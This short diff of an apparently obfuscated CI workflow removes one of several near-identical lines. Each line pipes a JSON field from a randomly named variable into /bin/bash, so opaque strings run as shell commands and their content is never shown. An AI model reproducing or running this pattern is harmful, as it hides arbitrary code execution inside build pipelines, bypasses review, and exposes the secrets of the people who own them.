@@ -22,7 +22,6 @@ jobs:
           echo $jb3012 | jq -r .g73 | /bin/bash
           echo $dyipl8 | jq -r .ohccj2 | /bin/bash
           echo $ge71 | jq -r .occx6405 | /bin/bash
-          echo $iwvyk109 | jq -r .l3 | /bin/bash
           printf '%s' "$at90" | jq -r .hd96 | /bin/bash
           echo $xoldx3549 | jq -r .iolm2488 | /bin/bash
           echo $c23427 | jq -r .py5 | /bin/bash
